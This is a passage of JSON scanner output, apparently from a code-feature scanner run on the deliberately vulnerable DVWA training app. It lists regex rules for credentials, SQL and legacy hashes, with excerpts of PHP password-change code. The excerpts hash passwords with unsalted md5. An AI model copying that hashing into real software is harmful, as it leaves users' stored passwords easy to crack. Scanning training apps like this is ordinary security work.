        "excerpt": "\t}\n\telse {\n\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n",
        "startLocationLine": 41,
        "startLocationColumn": 78,
        "endLocationLine": 41,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t}\n\telse {\n\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n",
        "startLocationLine": 41,
        "startLocationColumn": 91,
        "endLocationLine": 41,
        "endLocationColumn": 99
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n",
        "startLocationLine": 43,
        "startLocationColumn": 23,
        "endLocationLine": 43,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t// Do both new password match and was the current password correct?\n\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n\t\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n",
        "startLocationLine": 49,
        "startLocationColumn": 44,
        "endLocationLine": 49,
        "endLocationColumn": 52
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t// Do both new password match and was the current password correct?\n\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n\t\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n",
        "startLocationLine": 49,
        "startLocationColumn": 57,
        "endLocationLine": 49,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n\t\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 50,
        "startLocationColumn": 24,
        "endLocationLine": 50,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t\t}\n\t\telse {\n\t\t\t// Feedback for the end user - failed!\n\t\t\t$html .= &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n",
        "startLocationLine": 55,
        "startLocationColumn": 19,
        "endLocationLine": 55,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t}\n\t\telse {\n\t\t\t// Feedback for the end user - failed!\n\t\t\t$html .= &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n\t\t}\n\t}\n}\n\n",
        "startLocationLine": 59,
        "startLocationColumn": 39,
        "endLocationLine": 59,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t\t}\n\t\telse {\n\t\t\t// Feedback for the end user - failed!\n\t\t\t$html .= &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n\t\t}\n\t}\n}\n\n",
        "startLocationLine": 59,
        "startLocationColumn": 72,
        "endLocationLine": 59,
        "endLocationColumn": 81
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t}\n\telse {\n\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n",
        "startLocationLine": 41,
        "startLocationColumn": 33,
        "endLocationLine": 41,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t}\n\telse {\n\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n",
        "startLocationLine": 41,
        "startLocationColumn": 78,
        "endLocationLine": 41,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t}\n\telse {\n\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n",
        "startLocationLine": 41,
        "startLocationColumn": 91,
        "endLocationLine": 41,
        "endLocationColumn": 99
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n",
        "startLocationLine": 43,
        "startLocationColumn": 23,
        "endLocationLine": 43,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t// Do both new password match and was the current password correct?\n\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n\t\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n",
        "startLocationLine": 49,
        "startLocationColumn": 44,
        "endLocationLine": 49,
        "endLocationColumn": 52
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t// Do both new password match and was the current password correct?\n\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n\t\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n",
        "startLocationLine": 49,
        "startLocationColumn": 57,
        "endLocationLine": 49,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n\t\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 50,
        "startLocationColumn": 24,
        "endLocationLine": 50,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t\t}\n\t\telse {\n\t\t\t// Feedback for the end user - failed!\n\t\t\t$html .= &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n",
        "startLocationLine": 55,
        "startLocationColumn": 19,
        "endLocationLine": 55,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t}\n\t\telse {\n\t\t\t// Feedback for the end user - failed!\n\t\t\t$html .= &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n\t\t}\n\t}\n}\n\n",
        "startLocationLine": 59,
        "startLocationColumn": 39,
        "endLocationLine": 59,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );",
        "excerpt": "\t}\n\telse {\n\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n",
        "startLocationLine": 41,
        "startLocationColumn": 25,
        "endLocationLine": 41,
        "endLocationColumn": 114
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );",
        "excerpt": "\t\t// Do both new password match and was the current password correct?\n\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n\t\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n",
        "startLocationLine": 49,
        "startLocationColumn": 26,
        "endLocationLine": 49,
        "endLocationColumn": 93
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "private_key",
        "excerpt": "\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39; ],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n\t);\n\n\t// Did the CAPTCHA fail?\n\tif( !$resp ) {\n",
        "startLocationLine": 28,
        "startLocationColumn": 22,
        "endLocationLine": 28,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass_new  = $_POST[ &#39;password_new&#39; ];\n\t$pass_new  = stripslashes( $pass_new );\n\t$pass_new  = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_new  = md5( $pass_new );\n\n\t$pass_conf = $_POST[ &#39;password_conf&#39; ];\n\t$pass_conf = stripslashes( $pass_conf );\n\t$pass_conf = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_conf ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_conf = md5( $pass_conf );\n",
        "startLocationLine": 14,
        "startLocationColumn": 15,
        "endLocationLine": 14,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass_conf = $_POST[ &#39;password_conf&#39; ];\n\t$pass_conf = stripslashes( $pass_conf );\n\t$pass_conf = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_conf ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_conf = md5( $pass_conf );\n\n\t$pass_curr = $_POST[ &#39;password_current&#39; ];\n\t$pass_curr = stripslashes( $pass_curr );\n\t$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_curr = md5( $pass_curr );\n",
        "startLocationLine": 19,
        "startLocationColumn": 15,
        "endLocationLine": 19,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass_curr = $_POST[ &#39;password_current&#39; ];\n\t$pass_curr = stripslashes( $pass_curr );\n\t$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_curr = md5( $pass_curr );\n\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39; ],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n",
        "startLocationLine": 24,
        "startLocationColumn": 15,
        "endLocationLine": 24,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t\t}\n\t\telse {\n\t\t\t// Both new passwords do not match.\n\t\t\t$html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n\t\t}\n\t}\n}\n\n",
        "startLocationLine": 40,
        "startLocationColumn": 28,
        "endLocationLine": 40,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
